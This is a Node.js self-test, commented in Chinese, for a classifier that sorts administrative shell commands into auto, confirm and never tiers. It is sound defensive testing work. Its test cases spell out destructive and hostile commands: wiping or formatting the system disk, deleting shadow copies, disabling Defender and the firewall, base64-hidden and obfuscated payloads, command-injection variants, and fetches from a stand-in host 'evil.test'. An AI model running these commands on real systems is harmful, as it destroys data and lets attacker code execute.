#!/usr/bin/env node
/**
 * 管理员代理 · 分级器自检（纯函数，不执行任何命令）。
 *
 * 运行：node src/broker-policy-selftest.mjs
 *
 * 覆盖 docs/research/admin-broker-review-2026-10-25.md 的 v2 白名单规格：
 *   · 默认 confirm；只有「纯文本闸门 + 整行白名单」两条都过才 auto；
 *   · never / 解码 / 伪装能力保留；
 *   · 24 条攻击回归 + 变体 + 对照组；
 *   · 2000 条随机命令的性质测试。
 *
 * 纪律：所有结论来自实际调用 classifyForBroker 的输出；不 mock、不猜。
 */

import * as policy from "./core/broker-policy.js";

const { classifyForBroker, NEVER_PATTERNS } = policy;

const results = [];
function check(name, ok, detail = "") {
  results.push({ name, ok: Boolean(ok), detail: String(detail) });
  console.log(`${ok ? "PASS" : "FAIL"}  ${name}${detail ? `  —— ${detail}` : ""}`);
}

function expectTier(label, command, tier, design = "v2 规格") {
  const result = classifyForBroker(command);
  check(`${label} → ${tier}`, result.tier === tier, `${result.tier}（${result.reason}）｜${JSON.stringify(command)}`);
  return result;
}

/* ================================================================== *
 * 0. 导出契约 + 三档基本边界
 * ================================================================== */
console.log("\n=== 导出契约 ===");
const exported = Object.keys(policy).sort();
check(
  "只导出 NEVER_PATTERNS / classifyForBroker / findNever",
  JSON.stringify(exported) === JSON.stringify(["NEVER_PATTERNS", "classifyForBroker", "findNever"]),
  exported.join(", "),
);
check("NEVER_PATTERNS 非空", Array.isArray(NEVER_PATTERNS) && NEVER_PATTERNS.length > 0, `共 ${NEVER_PATTERNS.length} 条`);

console.log("\n=== 三档基本边界（v2：默认 confirm） ===");
expectTier("普通只读 ls（v2 不再 auto）", "ls -la", "confirm");
expectTier("普通只读 Get-ChildItem（v2 不再 auto）", "Get-ChildItem -Force", "confirm");
expectTier("装包 npm install（v2 不再 auto）", "npm install", "confirm");
expectTier("装包 pip install（v2 不再 auto）", "pip install requests", "confirm");
expectTier("重启服务 Restart-Service Spooler", "Restart-Service Spooler", "auto");
expectTier("查进程 Get-Process", "Get-Process", "auto");
expectTier("改本软件自己的文件（v2 不再 auto）", "Set-Content -LiteralPath 'D:\\work\\bridge-replica-e45\\src\\core\\broker-policy.js' -Value 'x'", "confirm");
expectTier("删本软件自己的文件（v2 不再 auto）", "Remove-Item -LiteralPath 'D:\\work\\bridge-replica-e45\\src\\core\\broker-policy.js' -Force", "confirm");
expectTier("危险 shutdown", "shutdown /r /t 0", "confirm");
expectTier("危险 taskkill", "taskkill /F /IM foo.exe", "confirm");
expectTier("危险 git push --force", "git push --force", "confirm");
expectTier("删除工作区外的文件", "Remove-Item -LiteralPath 'C:\\Users\\me\\a.txt' -Force", "confirm");
expectTier("未识别 net user", "net user", "confirm");
expectTier("未识别内联脚本", "python -c \"print(1)\"", "confirm");

const fmt = expectTier("格式化系统盘", "format C:", "never");
check("never 的 baseLevel 如实带出 guard 判定", fmt.baseLevel === "destructive", `baseLevel=${fmt.baseLevel}`);
const rmRoot = expectTier("全盘 rm -rf /", "rm -rf /", "never");
check("全盘删除的 baseLevel 是 destructive", rmRoot.baseLevel === "destructive", `baseLevel=${rmRoot.baseLevel}`);
const wmic = expectTier("wmic diskdrive 清空", "wmic diskdrive where \"DeviceID='\\\\\\\\\\\\\\\\.\\\\\\\\PHYSICALDRIVE0'\" call format", "never");
check("wmic 的 baseLevel 是 unknown（但 tier 仍然 never）", wmic.baseLevel === "unknown", `baseLevel=${wmic.baseLevel}`);

/* ================================================================== *
 * 1. never / 解码 / 伪装（保留原有能力）
 * ================================================================== */
console.log("\n=== never / 解码 / 伪装 ===");

const b64u16 = (text) => Buffer.from(text, "utf16le").toString("base64");
const b64u8 = (text) => Buffer.from(text, "utf8").toString("base64");

// 1a base64 / -enc / iex
expectTier("powershell -enc 藏全盘删除", `powershell -enc ${b64u16("Remove-Item C:\\ -Recurse -Force")}`, "never");
expectTier("FromBase64String + iex 藏全盘删除", `iex ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('${b64u8("Remove-Item C:\\ -Recurse -Force")}')))`, "never");
expectTier("base64 -d 管道藏全盘删除", `Write-Output ${b64u8("Remove-Item C:\\ -Recurse -Force")} | base64 -d | sh`, "never");
expectTier("powershell -enc 解出只读命令也不 auto", `powershell -enc ${b64u16("Get-ChildItem")}`, "confirm");
expectTier("iex 动态执行", "iex 'Get-ChildItem'", "confirm");

// 1b 拆行 / 换行 / 多余空格
expectTier("拆行夹带全盘删除", "Write-Output ok\nRemove-Item C:\\ -Recurse -Force", "never");
expectTier("第二行格式化系统盘", "Write-Output ok\nformat C:", "never");
expectTier("多余空格不绕过", "Remove-Item     C:\\     -Recurse     -Force", "never");
expectTier("format 后多余空格", "format        C:", "never");

// 1c 注释
expectTier("危险命令后加注释", "format C: # 清理磁盘", "never");
expectTier("注释行后的危险命令", "# harmless\nformat C:", "never");

// 1d 别名 del / rm / Remove-Item / rd
expectTier("别名 del 删盘根", "del /f /s /q C:\\*", "never");
expectTier("别名 rm 删盘根", "rm -rf /", "never");
expectTier("别名 rd 删盘根", "rd /s /q C:\\", "never");
expectTier("别名 Remove-Item 删盘根", "Remove-Item C:\\ -Recurse -Force", "never");
expectTier("别名 Remove-Item -LiteralPath 删盘根", "Remove-Item -LiteralPath 'C:\\' -Recurse", "never");
expectTier("小写 del 删系统目录", "del /f /s /q C:\\Windows\\*", "never");

// 1e cmd /c 与 powershell -Command
expectTier("cmd /c 格式化系统盘", "cmd /c \"format C:\"", "never");
expectTier("用 format.com 全路径格式化", "& \"C:\\Windows\\System32\\format.com\" C:", "never");
expectTier("cmd /c 全盘删除", "cmd /c \"del /f /s /q C:\\*\"", "never");
expectTier("cmd /c 包一层 npm install（v2 不再 auto）", "cmd /c \"npm install\"", "confirm");
expectTier("powershell -Command 全盘删除", "powershell -Command \"Remove-Item C:\\ -Recurse -Force\"", "never");
expectTier("powershell -NoProfile -Command 只读（v2 不再 auto）", "powershell -NoProfile -Command \"Get-Process\"", "confirm");

// 1f && / ; / 管道 / cmd 单 &
expectTier("&& 串接", "Write-Output ok && format C:", "never");
expectTier("; 串接", "Write-Output ok; Remove-Item C:\\ -Recurse -Force", "never");
expectTier("管道串接", "Get-ChildItem | format C:", "never");
expectTier("管道把系统目录喂给删除命令", "Get-ChildItem C:\\Windows | Remove-Item -Force", "confirm");
expectTier("管道把系统盘文件喂给删除命令", "Get-ChildItem C:\\ | Remove-Item", "confirm");
expectTier("普通只读管道（v2 不再 auto）", "Get-ChildItem | Sort-Object", "confirm");
expectTier("管道喂给 Set-Content（目标路径不可见）", "Get-Content D:\\repo\\a | Set-Content D:\\repo\\b", "confirm");
expectTier("cmd 单 & 串接", "Write-Output ok & del /f /s /q C:\\*", "never");

// 1g 变量拼接 / 无法识别的写法
expectTier("变量拼接后 iex（不 auto）", "$a = 'del /f /s /q C:'; $b = '\\*'; Invoke-Expression ($a + $b)", "confirm");
expectTier("cmd 脱字符伪装（不 auto）", "fo^rmat C:", "confirm");
expectTier("未知解释器参数（不 auto）", "powershell -Command \"& $cmd\"", "confirm");

// 1h UNC 路径
expectTier("UNC 递归删除", "Remove-Item \\\\server\\share\\data -Recurse", "confirm");
expectTier("UNC 普通删除", "del \\\\server\\share\\file.txt", "confirm");

// 1i 环境变量形式的系统盘
expectTier("format %SystemDrive%", "format %SystemDrive%", "never");
expectTier("format $env:SystemDrive", "format $env:SystemDrive", "never");
expectTier("format 非系统盘只 confirm", "format D:", "confirm");
expectTier("Format-Volume 系统盘", "format-volume -DriveLetter C", "never");

/* ================================================================== *
 * 2. never 清单逐条
 * ================================================================== */
console.log("\n=== never 清单 ===");
expectTier("rm -rf --no-preserve-root /", "rm -rf --no-preserve-root /", "never");
expectTier("引号包住盘根 rm", 'rm -rf "/"', "never");
expectTier("引号包住盘根 Remove-Item", 'Remove-Item -LiteralPath "/" -Recurse', "never");
expectTier("PowerShell 花括号系统盘", "Remove-Item ${env:SystemDrive}\\* -Recurse", "never");
expectTier("Git Bash 的 /c/ 盘根", "rm -rf /c/", "never");
expectTier("WSL 的 /mnt/c/ 盘根", "rm -rf /mnt/c/", "never");
expectTier("dd 写 PhysicalDrive0", "dd if=/dev/zero of=\\\\.\\PhysicalDrive0 bs=1M", "never");
expectTier("dd 写 /dev/sda", "dd if=/dev/zero of=/dev/sda bs=1M", "never");
expectTier("cipher /w 整盘", "cipher /w:C:", "never");
expectTier("vssadmin 删除全部卷影", "vssadmin delete shadows /all /quiet", "never");
expectTier("wmic shadowcopy 删除", "wmic shadowcopy delete", "never");
expectTier("Clear-Disk 清 0 号盘", "Clear-Disk -Number 0 -RemoveData", "never");
expectTier("Clear-Disk 清非系统盘只 confirm", "Clear-Disk -Number 1 -RemoveData", "confirm");
expectTier("mkfs 整块物理盘", "mkfs.ext4 /dev/sda", "never");
expectTier("mkfs 单个分区只 confirm", "mkfs.ext4 /dev/sda1", "confirm");
expectTier("dd 写分区只 confirm", "dd if=/dev/zero of=/dev/sda1 bs=1M", "confirm");
expectTier("diskpart clean all", "diskpart /s wipe.txt\nselect disk 0\nclean all", "never");
expectTier("递归删系统目录", "Remove-Item C:\\Windows -Recurse", "never");
expectTier("花括号 windir 系统目录", "Remove-Item ${env:windir} -Recurse", "never");
expectTier("递归删用户目录", "Remove-Item C:\\Users -Recurse", "never");
expectTier("System32 直接删所有 dll（无 -Recurse）", "Remove-Item C:\\Windows\\System32\\*.dll", "never");
expectTier("直接删所有用户（无 -Recurse）", "Remove-Item C:\\Users\\*", "never");
expectTier("只删一个用户目录仍只 confirm", "Remove-Item C:\\Users\\me -Force", "confirm");
expectTier("系统目录的子目录仍只 confirm", "Remove-Item C:\\Windows\\Temp -Force", "confirm");
expectTier("通配符下面的深层清理只 confirm", "Remove-Item C:\\Users\\*\\AppData\\Local\\Temp\\* -Force", "confirm");

/* ================================================================== *
 * 3. confirm 边界（宁可多确认）
 * ================================================================== */
console.log("\n=== confirm 边界 ===");
expectTier("普通 /tmp 删除", "rm -rf /tmp", "confirm");
expectTier("工作区里的递归删除", "Remove-Item C:\\Users\\me\\project -Recurse", "confirm");
expectTier("系统目录的子目录", "Remove-Item C:\\Windows\\Temp\\a -Recurse", "confirm");
expectTier("工作区外新建文件", "New-Item C:\\Temp\\x -ItemType File", "confirm");
expectTier("注册表写入", "New-Item HKLM:\\Software\\Foo", "confirm");
expectTier("Registry:: 写法写注册表", "New-Item Registry::HKEY_CURRENT_USER\\Software\\Foo", "confirm");
expectTier("HKCU 路径写注册表", "Copy-Item D:\\repo\\a HKCU:\\Software\\Foo", "confirm");
expectTier("重定向到工作区外", "echo hi > C:\\Windows\\x.txt", "confirm");
expectTier("停防火墙服务", "Restart-Service mpssvc", "confirm");
expectTier("netsh 关防火墙", "netsh advfirewall set allprofiles state off", "confirm");
expectTier("关 Defender 实时防护", "Set-MpPreference -DisableRealtimeMonitoring $true", "confirm");
expectTier("curl 下载到系统目录", "curl -o C:\\Windows\\x.exe https://example.com/x.exe", "confirm");
expectTier("curl 下载到本软件目录（v2 下载不再 auto）", "curl -o 'D:\\work\\bridge-replica-e45\\x' https://example.com/x", "confirm");
expectTier("Invoke-WebRequest 下载到系统目录", "Invoke-WebRequest -OutFile C:\\Windows\\x https://example.com/x", "confirm");
expectTier("wget 下载到系统目录", "wget -O C:\\Windows\\x https://example.com/x", "confirm");
expectTier("本软件目录里的重定向（v2 不再 auto）", "echo hi > 'D:\\work\\bridge-replica-e45\\x'", "confirm");
expectTier("本软件目录里的批量删除仍要确认", "Remove-Item 'D:\\work\\bridge-replica-e45\\*' -Force", "confirm");

/* ================================================================== *
 * 4. 工作目录切换（v2 删掉 cd 的 auto）
 * ================================================================== */
console.log("\n=== 工作目录切换（v2 一律 confirm） ===");
expectTier("cd 到系统目录后装包", "cd C:\\Windows && npm install", "confirm");
expectTier("cmd /c 里 cd 到系统目录后装包", "cmd /c \"cd /d C:\\Windows && npm install\"", "confirm");
expectTier("PowerShell Set-Location 到系统目录", "powershell -Command \"Set-Location C:\\Windows; npm install\"", "confirm");
expectTier("cd .. 后写相对路径", "cd .. && Remove-Item foo -Force", "confirm");
expectTier("cd 用环境变量", "cd $env:TEMP; npm install", "confirm");
expectTier("pushd 到系统目录", "pushd C:\\Windows", "confirm");
expectTier("popd 目标不可预测", "popd", "confirm");
expectTier("Set-Location -Path: 语法", "Set-Location -Path:'C:\\Windows'; npm install", "confirm");
expectTier("Set-Location 参数在路径前", "Set-Location -PassThru C:\\Windows", "confirm");
expectTier("引号里的多行 cd 不能藏", "powershell -Command \"Get-ChildItem\ncd C:\\Windows\nnpm install\"", "confirm");
expectTier("引号里的 & 串接 cd 不能藏", "cmd /c \"Get-ChildItem & cd /d C:\\Windows & npm install\"", "confirm");
expectTier("cd 到本软件目录内也不再 auto", "cd 'D:\\work\\bridge-replica-e45' && npm install", "confirm");

/* ================================================================== *
 * 5. 攻击回归（规格 24 条 + 变体 + 对照组）
 * ================================================================== */
console.log("\n=== 攻击回归：规格 24 条 ===");
const ATTACKS = [
  ["1 子表达式 Invoke-Expression", "Get-Process $(Invoke-Expression 'calc')"],
  ["2 括号表达式 Start-Process", "Get-Process -Name (Start-Process calc -PassThru).Name"],
  ["3 Restart-Service 子表达式 iex", "Restart-Service $(iex 'calc')"],
  ["4 -Name 双引号子表达式", "Get-Process -Name \"$(iex calc)\""],
  ["5 Start-Service 下载内容", "Start-Service ((iwr http://evil.test/x.txt).Content)"],
  ["6 管道 ForEach-Object 块", "Get-Process | ForEach-Object { Start-Process calc }"],
  ["7 管道别名 % + 调用运算符", "Get-Service | % { & calc }"],
  ["8 管道喂给 iex", "Get-Process | iex"],
  ["9 分号（带空格）", "Get-Process; Start-Process calc"],
  ["10 分号（无空格）", "Get-Process;Start-Process calc"],
  ["11 别名 ps + cmd 单 &", "ps & calc"],
  ["12 逻辑或 ||", "Get-Process || calc"],
  ["13 调用运算符绝对路径", "& 'C:\\Users\\Public\\evil.exe'"],
  ["14 块注释换行藏命令", "<# harmless #>\nStart-Process calc"],
  ["15 反引号续行", "Get-Process `\nStart-Process calc"],
  ["16 wmic 创建进程", "wmic process call create calc"],
  ["17 sc config 改 binPath", "sc config Spooler binPath= C:\\evil.exe"],
  ["18 Set-Content 系统目录", "Set-Content C:\\Windows\\System32\\x.txt hi"],
  ["19 npm install", "npm install left-pad"],
  ["20 pip install URL", "pip install https://evil.test/x.tar.gz"],
  ["21 choco install -y", "choco install somepkg -y"],
  ["22 winget install", "winget install SomeVendor.App"],
  ["23 Set-Content 本软件策略文件", "Set-Content D:\\work\\bridge-replica-e45\\src\\core\\broker-policy.js 'x'"],
  ["24 Add-Content 本软件 broker", "Add-Content D:\\work\\bridge-replica-e45\\src\\broker\\broker.mjs 'x'"],
];
for (const [label, command] of ATTACKS) expectTier(`攻击 ${label}`, command, "confirm");

console.log("\n=== 攻击回归：变体 ===");
expectTier("变体 全角分号", "Get-Process；Start-Process calc", "confirm");
expectTier("变体 全角括号", "Get-Process （Start-Process calc）", "confirm");
expectTier("变体 零宽字符", "Restart-Service\u200B -Name Spooler", "confirm");
expectTier("变体 NBSP", "Restart-Service\u00A0-Name Spooler", "confirm");
expectTier("变体 零宽字符夹在 Get-Process 里", "Get-Process\u200B -Name node", "confirm");
expectTier("变体 前导 NBSP 不能 trim 成 auto", "\u00A0Get-Process -Name node", "confirm");
expectTier("变体 尾随换行不算单行", "Get-Process -Name node\n", "confirm");
expectTier("变体 CRLF 尾随换行不算单行", "Get-Process -Name node\r\n", "confirm");
expectTier("变体 尾随制表符不是允许字符", "Get-Process -Name node\t", "confirm");
expectTier("变体 Restart-Service WinDefend", "Restart-Service WinDefend", "confirm");
expectTier("变体 -ComputerName 不在白名单", "Restart-Service -Name x -ComputerName evil", "confirm");
expectTier("变体 缩写参数 -n", "Get-Process -n node", "confirm");

console.log("\n=== 攻击回归：对照组必须 auto ===");
expectTier("对照 Get-Process -Name node", "Get-Process -Name node", "auto");
expectTier("对照 Restart-Service -Name Spooler", "Restart-Service -Name Spooler", "auto");
expectTier("对照 Get-Service Spooler", "Get-Service Spooler", "auto");
expectTier("对照 net start Spooler", "net start Spooler", "auto");

/* ================================================================== *
 * 6. 白名单正向形状（确认规格列出的写法确实能 auto）
 * ================================================================== */
console.log("\n=== 白名单正向形状 ===");
const WHITELIST_OK = [
  ["Get-Process -Id 123", "Get-Process -Id 123"],
  ["Get-Process node,nginx", "Get-Process node,nginx"],
  ["Get-Process -Name *", "Get-Process -Name *"],
  ["Get-Process -IncludeUserName", "Get-Process -IncludeUserName"],
  ["Get-Service -Name Spooler", "Get-Service -Name Spooler"],
  ["Get-Service Spooler,Dhcp", "Get-Service Spooler,Dhcp"],
  ["Get-NetTCPConnection -LocalPort 443", "Get-NetTCPConnection -LocalPort 443"],
  ["Get-NetTCPConnection -State Listen", "Get-NetTCPConnection -State Listen"],
  ["Get-NetTCPConnection -LocalPort 443 -State Listen", "Get-NetTCPConnection -LocalPort 443 -State Listen"],
  ["Get-WinEvent -LogName System", "Get-WinEvent -LogName System"],
  ["Get-WinEvent -LogName System -MaxEvents 200", "Get-WinEvent -LogName System -MaxEvents 200"],
  ["tasklist", "tasklist"],
  ["tasklist /v", "tasklist /v"],
  ["netstat -ano", "netstat -ano"],
  ["Start-Service Spooler", "Start-Service Spooler"],
  ["Restart-Service -Name Spooler -Force", "Restart-Service -Name Spooler -Force"],
  ["sc start Spooler", "sc start Spooler"],
  ["sc.exe start Spooler", "sc.exe start Spooler"],
];
for (const [label, command] of WHITELIST_OK) expectTier(`白名单 ${label}`, command, "auto");

console.log("\n=== 白名单负向形状（必须 confirm） ===");
const WHITELIST_BAD = [
  ["Get-WinEvent 缺 -LogName", "Get-WinEvent"],
  ["Get-WinEvent -MaxEvents 0", "Get-WinEvent -LogName System -MaxEvents 0"],
  ["Get-WinEvent -MaxEvents 201", "Get-WinEvent -LogName System -MaxEvents 201"],
  ["Get-Process 多余参数", "Get-Process -Name node -Id 1"],
  ["Get-NetTCPConnection 状态不是 Listen", "Get-NetTCPConnection -State Established"],
  ["tasklist 多余参数", "tasklist /v /fo csv"],
  ["netstat 多余参数", "netstat -ano -b"],
  ["服务名含通配符", "Restart-Service -Name Spo*"],
  ["服务名超长 65", `Restart-Service -Name ${"a".repeat(65)}`],
  ["多余 -Force 位置参数", "net start Spooler -Force"],
];
for (const [label, command] of WHITELIST_BAD) expectTier(`白名单拒绝 ${label}`, command, "confirm");

/* ================================================================== *
 * 7. 性质测试：含禁用字符的命令一定不是 auto
 * ================================================================== */
console.log("\n=== 性质测试（2000 条随机命令） ===");

const ALLOWED = new Set("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789 _-.:\\/'\",=*");
const ALPHABET = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789 _-.:\\/'\",=*"
  + "$(){}[];&|<>@#^%!~`\n\r\t"
  + "中文全角；，（）　"
  + "\u200b\u00a0\u3000";
const alphabet = [...ALPHABET];

function mulberry32(seed) {
  return function next() {
    seed |= 0;
    seed = (seed + 0x6D2B79F5) | 0;
    let t = Math.imul(seed ^ (seed >>> 15), 1 | seed);
    t = (t + Math.imul(t ^ (t >>> 7), 61 | t)) ^ t;
    return ((t ^ (t >>> 14)) >>> 0) / 4294967296;
  };
}

const random = mulberry32(0x5EED1234);
const failures = [];
let withDisabled = 0;
let autoCount = 0;
for (let i = 0; i < 2000; i += 1) {
  const length = Math.floor(random() * 41);
  let command = "";
  for (let j = 0; j < length; j += 1) {
    command += alphabet[Math.floor(random() * alphabet.length)];
  }
  const hasDisabled = [...command].some((ch) => !ALLOWED.has(ch));
  const result = classifyForBroker(command);
  if (result.tier === "auto") autoCount += 1;
  if (!hasDisabled) continue;
  withDisabled += 1;
  if (result.tier === "auto") failures.push({ command, reason: result.reason });
}

check("随机样本里确实生成了含禁用字符的命令", withDisabled > 0, `含禁用字符 ${withDisabled}/2000`);

/* 变异测试（Claude 审查时补）：上面的随机样本里 auto 为 0 条，等于没测到「合法命令被插入禁用字符」这件事。
 * 这里拿一批写法合规、本来就是 auto 的命令，在每个位置各插一个禁用字符，断言一条都不能还是 auto。 */
console.log("\n=== 变异测试（合法命令里插禁用字符） ===");
{
  const bases = ["Get-Process -Name node", "Get-Process", "Get-Service Spooler", "Restart-Service -Name Spooler -Force", "Start-Service Spooler",
    "net start Spooler", "sc start Spooler", "sc.exe start Spooler", "tasklist /v", "netstat -ano",
    "Get-NetTCPConnection -LocalPort 80 -State Listen", "Get-WinEvent -LogName System -MaxEvents 10"];
  const baseAuto = bases.filter((b) => classifyForBroker(b).tier === "auto").length;
  check("变异测试的原料确实都是 auto（否则这个测试是空的）", baseAuto === bases.length, `${baseAuto}/${bases.length}`);
  const badChars = ["$", "(", ")", "{", "}", "[", "]", ";", "&", "|", "<", ">", "@", "#", "`", "^", "%", "!", "~", "\n", "\r", "\t",
    "\u00a0", "\u200b", "\u200d", "\ufeff", "\uff1b", "\uff08", "\uff09", "\uff06", "\u2028", "\u0000", "é", "中", "'", '"'];
  let total = 0;
  const stillAuto = [];
  for (const base of bases) for (const ch of badChars) for (let i = 0; i <= base.length; i += 1) {
    const mutated = base.slice(0, i) + ch + base.slice(i);
    total += 1;
    if (classifyForBroker(mutated).tier === "auto") stillAuto.push(JSON.stringify(mutated));
  }
  check("插入任何禁用字符后都不再是 auto", stillAuto.length === 0, `共 ${total} 条变异，仍是 auto：${stillAuto.slice(0, 5).join(" / ") || "0"}`);
}
check(
  "含禁用字符的命令一律不是 auto",
  failures.length === 0,
  failures.length ? `${failures.length} 条违规，例如 ${JSON.stringify(failures.slice(0, 3))}` : `0 条违规（样本中 auto ${autoCount} 条，均不含禁用字符）`,
);

/* ================================================================== *
 * 汇总
 * ================================================================== */
const passed = results.filter(row => row.ok).length;
const failed = results.filter(row => !row.ok);
console.log(`\n通过 ${passed}/${results.length}`);
console.log(`失败：${failed.length} 个${failed.length ? `（${failed.map(row => row.name).join("、")}）` : ""}`);
for (const row of failed) console.log(`  ✗ ${row.name}：${row.detail}`);
process.exit(failed.length ? 1 : 0);
